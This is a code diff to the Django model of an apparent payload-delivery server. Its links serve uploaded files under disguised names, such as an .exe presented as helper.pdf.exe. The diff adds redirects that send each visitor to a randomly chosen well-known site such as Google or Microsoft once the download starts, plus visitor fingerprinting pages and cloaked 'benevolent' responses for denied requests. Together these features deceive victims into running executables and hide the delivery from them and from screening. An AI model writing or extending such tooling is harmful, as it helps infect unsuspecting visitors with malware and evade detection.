@@ -129,6 +129,18 @@ def validate_auto_rules(value):
             raise ValidationError(f"Rule {index}: 'require_images' must be a boolean.")
 
 
+BENEVOLENT_TARGETS = [
+    "https://www.google.com/",
+    "https://www.microsoft.com/",
+    "https://www.apple.com/",
+    "https://www.cloudflare.com/",
+    "https://www.wikipedia.org/",
+    "https://www.adobe.com/",
+    "https://www.office.com/",
+    "https://www.mozilla.org/",
+]
+
+
 class DeliveryLink(models.Model):
     """An operator-controlled URL that gates access to keys, payloads, or proxied content."""
 
@@ -179,6 +191,20 @@ class DeliveryLink(models.Model):
     payload = models.FileField(upload_to="payloads/", blank=True, null=True)
     serve_as = models.CharField(max_length=200, blank=True,
                                 help_text="Filename presented to the visitor on download, e.g. the stored fwfafs.exe downloads as helper.pdf.exe. Empty = the real/uploaded name.")
+    post_download_redirect = models.BooleanField(
+        default=True,
+        help_text="File/proxy links: serve an interstitial that starts the download, then send the visitor to a harmless page.")
+    post_download_url = models.URLField(blank=True,
+                                        help_text="Custom page after the download. Empty = the link's benevolent target.")
+    benevolent_target = models.URLField(
+        blank=True,
+        help_text="Harmless destination after download. Picked randomly once at creation; stable afterwards (not rotated).")
+    loading_page = models.CharField(
+        max_length=120, blank=True,
+        help_text="Custom page from ./loading/ for the 'loading' held view. Empty = built-in page.")
+    fingerprint_page = models.CharField(
+        max_length=120, blank=True,
+        help_text="Custom page from ./fingerprint/ for the 'fingerprint' held view. Empty = built-in page.")
     benevolent_text = models.TextField(blank=True, help_text="Plain response served when a request is denied and on_deny=benevolent.")
     benevolent_file = models.FileField(upload_to="benevolent/", blank=True, null=True)
 
@@ -261,6 +287,23 @@ class DeliveryLink(models.Model):
             raise ValidationError(
                 {"serve_num": "The serve ratio numerator cannot exceed the denominator "
                               "(3/7 is fine, 7/3 is not)."})
+        if self.requires_approval and self.gate_type != "submission":
+            raise ValidationError(
+                {"requires_approval": "The verification gate only works with submission links "
+                                      "(the package is the approval request). Use operator "
+                                      "admission for per-visitor approval instead."})
+        import re
+        for field in ("loading_page", "fingerprint_page"):
+            value = getattr(self, field)
+            if value and not re.fullmatch(r"[A-Za-z0-9._-]+\.html", value):
+                raise ValidationError({field: "Pick an .html file from the page folder."})
+
+    def save(self, *args, **kwargs):
+        # Pick the harmless after-download page once, at creation; never rotated.
+        if self._state.adding and not self.benevolent_target:
+            import secrets
+            self.benevolent_target = secrets.choice(BENEVOLENT_TARGETS)
+        super().save(*args, **kwargs)
 
     def __str__(self):
         return f"{self.path} ({self.kind})"
